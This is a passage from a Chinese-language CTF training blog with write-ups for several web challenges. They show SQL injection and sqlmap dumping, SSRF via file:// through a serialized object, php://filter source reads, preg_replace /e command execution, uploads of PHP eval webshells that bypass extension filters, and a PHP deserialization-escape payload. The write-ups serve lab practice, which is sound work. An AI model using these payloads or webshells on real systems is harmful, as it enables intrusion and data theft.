class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审阅源码发现get()可能存在ssrf服务端楼的那个，join一个账号,点username页面跳转，发现一个注入点</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:44796/view.php?no=1</span><br></pre></td></tr></table></figure><p>下面开始注入测试：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">no=1 order by 5<span class="comment">#//报错，说明没有五个字段，并且爆出了路径在 /var/www/html/db.php下</span></span><br><span class="line">no=1 order by 5<span class="comment">#//正常回显，说明是4个字段，下面开始爆库</span></span><br></pre></td></tr></table></figure><p>这里有一个注意的地方就是,经过多次测试发现union 和select不能同时使用，用注释/**/进行绕过</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">no = -1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#//爆出fakebook库</span></span><br><span class="line"><span class="keyword">no</span>= <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'fakebook'</span><span class="comment">#//爆出users表</span></span><br><span class="line"><span class="keyword">no</span> = <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">#爆出no,username,passwd,data字段</span></span><br><span class="line">下面可以一个个查询信息，可以看到<span class="keyword">data</span>中的数据进行了序列化</span><br><span class="line">O:8:"UserInfo":3&#123;s:4:"name";s:7:"hjfashd";s:3:"age";i:1123;s:4:"blog";s:13:"www.baidu.com";&#125;</span><br></pre></td></tr></table></figure><p>在目录扫描中可以看到存在flag.php，可以把blog改为/var/www/html/flag.php路径就可以拿到flag了,这里还要注意用file：//协议来读取,此外data在第四个字段，所以这里查询时也要放在第四位</p><p>到这里，我们就可以根据已知的信息来构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:no=-1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:3:"ggg";s:3:"age";i:12356;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查看网页源码，可以看到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg=='&gt;//base64解码就可以了</span><br></pre></td></tr></table></figure><h4 id="0X04ics-04-20-03-14"><a href="#0X04ics-04-20-03-14" class="headerlink" title="0X04ics-04 20-03-14"></a>0X04ics-04 20-03-14</h4><p>根据题目描述，在注册和登录页面存在漏洞，注册一个账号登录，提示说普通用户登录成功但没什么用，看来是要拿到管理员的账号，这里有个忘记密码的页面，但好像暂时没什么用</p><p>上工具，用sqlmap进行尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; --dbs&#x2F;&#x2F;爆出了四个库，经过尝试发现所要的数据在cetc004中</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 --tables&#x2F;&#x2F;爆出user表</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 -T user --columns&#x2F;&#x2F;爆出四个字段，answer，question，password，username</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/5.png" class="" title="examplename"><p>可以看到已经存在的账户信息，密码被加密了，未找到解密方法，回到注册和登录页面</p><p>经过测试发现注册页面相同的账户名可以注册多次，登录界面同账户不同密码都可以成功登录</p><p>注册一个名为c3tlwDmIn23的新账户登录就能拿到flag</p><h4 id="0X05ics-05-20-03-14"><a href="#0X05ics-05-20-03-14" class="headerlink" title="0X05ics-05 20-03-14"></a>0X05ics-05 20-03-14</h4><p>拿到题目在<code>http://111.198.29.45:59907/index.php?page=1</code>发现注入点，看到到变量传参，有可能存在文件包含漏洞读取源码，又是php站，想到使用php伪协议读取源码</p><p><code>http://111.198.29.45:59907/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>base64解密，整理一下源码，这里就只附上重点部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到首先是一个判断，也就是访问是否来自本机，用X-Forwarded-For进行伪造即可</p><p>再来分析一下主题部分，通过get传入pattern、replacement、subject三个参数的值，通过preg_replace()函数，在subject找指定的pattern部分用replacement来进行替代</p><p>通过查找资料了解了preg_replace函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">reg_replace 函数执行一个正则表达式的搜索和替换</span><br><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br><span class="line">搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</span><br><span class="line">• $pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">• $replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">• $subject: 要搜索替换的目标字符串或字符串数组。</span><br><span class="line">• $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span><br><span class="line">• $count: 可选，为替换执行的次数。</span><br><span class="line">这个函数有个漏洞</span><br><span class="line">当$pattern使用了&#x2F;e修正符，替换的时候会把$replacement替换进去的代码当成php代码执行，当然要构成合法的php代码才能正确执行。</span><br></pre></td></tr></table></figure><p>思路出来了，用burp抓包</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/6.png" class="" title="examplename"><p>可以看到页面成功回显了</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/7.png" class="" title="examplename"><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;ls&quot;)&amp;&amp;sub=test</code></p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/8.png" class="" title="examplename"><p>下面一步需要注意，由于这里对空格进行了处理，可以用+或者%20来替代，“&amp;”用%26替代</p><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir%26%26+ls&quot;)&amp;&amp;sub=test</code></p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/9.png" class="" title="examplename"><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir/flag%26%26+ls&quot;)&amp;&amp;sub=test</code></p><p>找到了flag.php文件，这里就不贴图了</p><p>最后用cat来读取<code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cat+s3chahahaDir/flag/flag.php&quot;)&amp;&amp;sub=test</code></p><h4 id="0X06Bug-20-03-15"><a href="#0X06Bug-20-03-15" class="headerlink" title="0X06Bug  20-03-15"></a>0X06Bug  20-03-15</h4><p>打开题目场景是一个登录界面，有注册和修改密码的选项，先注册一个账号登录上去看看</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/10.png" class="" title="examplename"><p>点击manage选项，无法打开，有弹窗提示：You are not admin,很明显需要管理员账号登录，但是注册时显示账号已存在，看来关键点在修改密码的页面，抓包，成功将user改成admin，再次登录，点击manage，提示Ip not Allowed,抓包，加上X-Forwarded-For:127.0.0.1,成功打开，没什么提示，查看网页源码，发现信息</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/11.png" class="" title="examplename"><p>根据提示传入参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:39291&#x2F;index.php?module&#x3D;filemanage&amp;do&#x3D;1&#x2F;&#x2F;提示action is not correct</span><br><span class="line">尝试将do改成download，read，write，upload，最后发现时upload</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/12.png" class="" title="examplename"><p>接下来就是上传文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在测试中发现有&lt;?php会报错，这就想到用php的脚本模式</span><br><span class="line">构造内容:</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&quot;cmd&quot;])&lt;&#x2F;script&gt;以php后缀上传，burp抓包</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/13.png" class="" title="examplename"><p>根据提示尝试后缀名的绕过，在过程中发现对Content-Type有进行检测，将其改为image/jpeg，后缀名在已知的绕过方法中最后发现php4|php5可以，成功拿到flag</p><h4 id="0X07ics-07-20-03-18"><a href="#0X07ics-07-20-03-18" class="headerlink" title="0X07ics-07 20-03-18"></a>0X07ics-07 20-03-18</h4><p>打开界面，发现项目管理页面有跳转，有view-source可以看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">        $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">        $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line">        $result = mysql_query($sql);</span><br><span class="line">        $result = mysql_fetch_object($result);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="keyword">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</span><br><span class="line">      <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">floatval($_GET[id]) !== <span class="string">'1'</span><span class="comment">//浮点数不能为1</span></span><br><span class="line">substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>)<span class="comment">//id的倒数最后一个数为9</span></span><br><span class="line">mysql_real_escape_string（ ）函数会在单引号前加\依次来防止sql注入</span><br><span class="line"><span class="comment">//这里可以用1/9进行绕过</span></span><br></pre></td></tr></table></figure><p>过了这一步来看下一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</span><br><span class="line">       $con = $_POST[<span class="string">'con'</span>];</span><br><span class="line">       $file = $_POST[<span class="string">'file'</span>];</span><br><span class="line">       $filename = <span class="string">"backup/"</span>.$file;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">'uploaded'</span>);</span><br><span class="line">           $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">           fwrite($f, $con);</span><br><span class="line">           fclose($f);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">$filename = <span class="string">"backup/"</span>.$file;<span class="comment">//backup是伪路径，这里用../可以绕过</span></span><br><span class="line">preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename)<span class="comment">//这一段正则真的没看懂，看了大佬的wp说是只过滤在最后一个点的后缀，可以用/.或者两个.php文件来绕过</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:file=../<span class="number">4.</span>php/.&amp;con=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问uploaded/4.php</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/15.png" class="" title="examplename"><p>用system来爆出路径下的文件，可以看到有flag.php,用cat来读取，在网页源码可以看到flag</p><p>还有一种方法是用菜刀连接，这里就不演示了</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/14.png" class="" title="examplename"><h4 id="0X08i-got-id-20-03-18"><a href="#0X08i-got-id-20-03-18" class="headerlink" title="0X08i-got-id 20-03-18"></a>0X08i-got-id 20-03-18</h4><p>打开有三个跳转链接，其中一个提示是Perl，有一个是文件上传页面，应该是Perl文件上传，去百度了以下有关的知识，猜测一下后台的逻辑</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> $cgi=CGI-&gt;new;</span><br><span class="line"><span class="keyword">if</span>($cgi-&gt;upload(<span class="string">'file'</span>))&#123;</span><br><span class="line"><span class="keyword">my</span> $file=$cgi-&gt;param(<span class="string">'file'</span>);</span><br><span class="line"><span class="keyword">while</span> (&lt;$file&gt;)&#123;<span class="keyword">print</span> <span class="string">"$_"</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的</span><br></pre></td></tr></table></figure><p>接下来上传一个argv文件再上传正常的文件，用bash来读取目录</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/16.png" class="" title="examplename"><p>接着直接读取/flag，就可以了</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0X01-FlatScience-20-03-11&quot;&gt;&lt;a href=&quot;#0X01-FlatScience-20-03-11&quot; class=&quot;headerlink&quot; title=&quot;0X01: FlatScience 20-03-11&quot;&gt;&lt;/a&gt;0X01: FlatScience 20-03-11
    
    </summary>
    
    
    
      <category term="train" scheme="http://yoursite.com/tags/train/"/>
    
  </entry>
  
  <entry>
    <title>buuojdiary</title>
    <link href="http://yoursite.com/2020/02/26/buuojdiary/"/>
    <id>http://yoursite.com/2020/02/26/buuojdiary/</id>
    <published>2020-02-26T07:58:32.000Z</published>
    <updated>2020-05-18T00:35:17.630Z</updated>
    
    <content type="html"><![CDATA[<p>[0CTF piapiapia]<a id="more"></a></p><p>前几天i春秋的比赛里面有一道反序列化逃逸的题目，对于菜鸡而言真的是一脸懵逼，后来看了出题人的出题笔记，找到了这道题，废话不多说，进入正题。</p><p>分析：扫描目录，可以从返回中找到<a href="http://www.zip，从而能够得到网站的逻辑和源码" target="_blank" rel="noopener">www.zip，从而能够得到网站的逻辑和源码</a></p><p>(1)注册 (2)登录 (3)修改信息</p><p>config.php中内容:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大概知道了需要读取config.php来拿到flag</p><p>接下来看一下profile.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure><p>从代码来看,所要做的应该就是让$profile[‘photo’]=’profile.php’，这里有一个反序列化，那么应该就是要利用反序列化漏洞来读取profile.php，这样就能得到base64加密过的信息</p><p>再来看update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br></pre></td></tr></table></figure><p>可以看出phone、email、nackname、photo都是可以进行操作的</p><p>在设置了profile的信息之后会调用这个函数进行处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在filter方法中进行了过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的东西，就是根据树哥的blog来做的，根据那篇文章这道题的点应该在nickname这里,可以看到filter中会用hacker来替代数组里的东西，也就有where的地方就会挤出字符</p><p>第一个长度限制可以用数组进行绕过,也就是nickname[]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure><p>下面来看一下正常序列化的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">Array</span>(</span><br><span class="line"> <span class="string">'phone'</span> =&gt; <span class="string">'12345678911'</span>,</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'woc2@qq.com'</span>,</span><br><span class="line">    <span class="string">'nickname'</span> =&gt; [<span class="string">'hello'</span>],</span><br><span class="line">    <span class="string">'photo'</span> =&gt; <span class="string">'upload/'</span>.md5(<span class="string">'123.jpg'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//a:4&#123;s:5:"phone";s:11:"12345678911";s:5:"email";s:11:"woc2@qq.com";s:8:"nickname";a:1&#123;i:0;s:5:"hello";&#125;s:5:"photo";s:39:"upload/f47454d1d3644127f42070181a8b9afc";&#125;</span></span><br></pre></td></tr></table></figure><p>现在要做的就是往nickname里塞入profile.php，直接给payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"15000000000"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"woc2@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>&#123;i:<span class="number">0</span>;s:<span class="number">204</span>:<span 